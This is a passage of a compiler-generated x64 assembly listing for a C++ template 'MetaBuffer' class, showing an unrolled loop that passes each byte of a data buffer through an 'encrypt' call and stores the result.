  0055f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00564	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0056b	88 41 20	 mov	 BYTE PTR [rcx+32], al
  0056e	b8 01 00 00 00	 mov	 eax, 1
  00573	48 6b c0 20	 imul	 rax, rax, 32		; 00000020H
  00577	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0057e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00582	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00589	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  0058e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00595	88 41 21	 mov	 BYTE PTR [rcx+33], al
  00598	b8 01 00 00 00	 mov	 eax, 1
  0059d	48 6b c0 21	 imul	 rax, rax, 33		; 00000021H
  005a1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005a8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005b3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  005b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005bf	88 41 22	 mov	 BYTE PTR [rcx+34], al
  005c2	b8 01 00 00 00	 mov	 eax, 1
  005c7	48 6b c0 22	 imul	 rax, rax, 34		; 00000022H
  005cb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005d2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005dd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  005e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005e9	88 41 23	 mov	 BYTE PTR [rcx+35], al
  005ec	b8 01 00 00 00	 mov	 eax, 1
  005f1	48 6b c0 23	 imul	 rax, rax, 35		; 00000023H
  005f5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005fc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00600	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00607	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  0060c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00613	88 41 24	 mov	 BYTE PTR [rcx+36], al
  00616	b8 01 00 00 00	 mov	 eax, 1
  0061b	48 6b c0 24	 imul	 rax, rax, 36		; 00000024H
  0061f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00626	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0062a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00631	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00636	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0063d	88 41 25	 mov	 BYTE PTR [rcx+37], al
  00640	b8 01 00 00 00	 mov	 eax, 1
  00645	48 6b c0 25	 imul	 rax, rax, 37		; 00000025H
  00649	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00650	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00654	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0065b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00660	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00667	88 41 26	 mov	 BYTE PTR [rcx+38], al
  0066a	b8 01 00 00 00	 mov	 eax, 1
  0066f	48 6b c0 26	 imul	 rax, rax, 38		; 00000026H
  00673	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0067a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0067e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00685	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  0068a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00691	88 41 27	 mov	 BYTE PTR [rcx+39], al
  00694	b8 01 00 00 00	 mov	 eax, 1
  00699	48 6b c0 27	 imul	 rax, rax, 39		; 00000027H
  0069d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006a4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006af	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  006b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006bb	88 41 28	 mov	 BYTE PTR [rcx+40], al
  006be	b8 01 00 00 00	 mov	 eax, 1
  006c3	48 6b c0 28	 imul	 rax, rax, 40		; 00000028H
  006c7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006ce	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006d2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006d9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  006de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006e5	88 41 29	 mov	 BYTE PTR [rcx+41], al
  006e8	b8 01 00 00 00	 mov	 eax, 1
  006ed	48 6b c0 29	 imul	 rax, rax, 41		; 00000029H
  006f1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006f8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006fc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00703	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00708	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0070f	88 41 2a	 mov	 BYTE PTR [rcx+42], al
  00712	b8 01 00 00 00	 mov	 eax, 1
  00717	48 6b c0 2a	 imul	 rax, rax, 42		; 0000002aH
  0071b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00722	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00726	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0072d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00732	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00739	88 41 2b	 mov	 BYTE PTR [rcx+43], al
  0073c	b8 01 00 00 00	 mov	 eax, 1
  00741	48 6b c0 2b	 imul	 rax, rax, 43		; 0000002bH
  00745	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0074c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00750	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00757	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  0075c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00763	88 41 2c	 mov	 BYTE PTR [rcx+44], al
  00766	b8 01 00 00 00	 mov	 eax, 1
  0076b	48 6b c0 2c	 imul	 rax, rax, 44		; 0000002cH
  0076f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00776	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0077a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00781	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00786	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0078d	88 41 2d	 mov	 BYTE PTR [rcx+45], al
  00790	b8 01 00 00 00	 mov	 eax, 1
  00795	48 6b c0 2d	 imul	 rax, rax, 45		; 0000002dH
  00799	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007a0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007a4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ab	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  007b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007b7	88 41 2e	 mov	 BYTE PTR [rcx+46], al
  007ba	b8 01 00 00 00	 mov	 eax, 1
  007bf	48 6b c0 2e	 imul	 rax, rax, 46		; 0000002eH
  007c3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007ca	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007ce	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007d5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  007da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007e1	88 41 2f	 mov	 BYTE PTR [rcx+47], al
  007e4	b8 01 00 00 00	 mov	 eax, 1
  007e9	48 6b c0 2f	 imul	 rax, rax, 47		; 0000002fH
  007ed	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007f4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007f8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ff	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00804	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0080b	88 41 30	 mov	 BYTE PTR [rcx+48], al
  0080e	b8 01 00 00 00	 mov	 eax, 1
  00813	48 6b c0 30	 imul	 rax, rax, 48		; 00000030H
  00817	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0081e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00822	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00829	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  0082e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00835	88 41 31	 mov	 BYTE PTR [rcx+49], al
  00838	b8 01 00 00 00	 mov	 eax, 1
  0083d	48 6b c0 31	 imul	 rax, rax, 49		; 00000031H
  00841	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00848	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0084c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00853	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00858	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0085f	88 41 32	 mov	 BYTE PTR [rcx+50], al
  00862	b8 01 00 00 00	 mov	 eax, 1
  00867	48 6b c0 32	 imul	 rax, rax, 50		; 00000032H
  0086b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00872	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00876	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0087d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00882	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00889	88 41 33	 mov	 BYTE PTR [rcx+51], al
  0088c	b8 01 00 00 00	 mov	 eax, 1
  00891	48 6b c0 33	 imul	 rax, rax, 51		; 00000033H
  00895	48 8b 8d f8 00
